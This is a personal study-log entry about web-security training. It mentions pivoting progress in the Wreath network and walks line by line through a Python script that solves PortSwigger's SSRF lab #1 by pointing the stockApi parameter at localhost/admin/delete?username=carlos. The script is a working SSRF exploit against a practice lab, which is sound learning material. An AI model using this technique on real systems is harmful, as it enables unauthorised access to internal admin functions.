"Sometimes in life, you have to make a selfish decision and do what's best for you." - Saquon Barkley

# Day-14 Summary:

### Things Done Today:

- [X] Wreath Network: Started with Pivoting sub-divided topic and done until task 10 out of 46. 
 - There are more 5 tasks in this Pivoting sub-topic, after doing so, will write a whole good summary about pivoting here, which means it's tomorrow. 

- [X] SSRF Lab #1: [Web-Security Academy](https://portswigger.net/web-security/) -- PortSwigger; [Rana Khalil's Course](https://ranakhalil.teachable.com/);
   - Done with lab#1 today: It was pretty easy and understood the python code [Check out the [full code in good format here](/Python/SSRF-lab1.py)], which I'm gonna tryna explain you people here below. 

1. Importing all the modules. Also disabling the warnings incase of not having the valid certificate.

```
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```
2. This thing is total optional, but in-order to check where you went wrong if the script doesn't work, this is real helpful thing to add onto the script.

```
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
```
3. [If name-main](https://www.freecodecamp.org/news/if-name-main-python-example/): Check out this article to know more about why do we add this. 
   - My explanation: In simple terms, the python interpreter always checks for this `__name__` function line if it is set to the same. it will execute whatever is mentioned to be executed under it. Also since python is interpreted lang, it checks code line by line. 

```
if __name__ == "__main__":
    main()
```
4. Defining the main function. Here if the arguments by the user is not in the correct format or length, the whole program won't execute, otherwise will execute the program, which here is deleting the user Carlos as mentioned to-do in the lab-01 of SSRF.

```
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)
```

5. After defining the main user, it's time now to define the `delete_user(url)`. The goal of the program is to get the admin access and then delete the user named carlos. While looking to the source code, we got the admin path which was `/admin` and while looking at the admin source code we got the delete user path `/delete?username=carlos`. So here the below code make's the resuest to the url mentioned by the user while excuting this script and does the task.

```
def delete_user(url):
    payload = 'http://localhost/admin/delete?username=carlos' #since we have to delete the carlos username
    check_stock_path = '/product/stock' 
    params = {'stockApi': payload} #which is in the stock request
    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params)
```
6. Now until above the if script executed, the user would have be deleted but what if we want to check if our script worked is correct or not, hence below code. Here we make an another request to the `/admin` path and in the response the script will check for keyword `User deleted successfully`, if mentioned then it is a success, if not - unsuccess. 

```
   # Now checking if it our script actually worked or not - which is here deleting the user name carlos 
    payload2 = 'http://localhost/admin'
    params2 = {'stockApi': payload2}
    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params2)
    if "User deleted successfully" in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was Unsuccessful.")
```
<img width="975" alt="Screenshot 2021-10-12 at 2 45 13 PM" src="https://user-images.githubusercontent.com/56188454/136928028-af5b83df-95d0-4138-aa05-8be47a4fed2e.png">


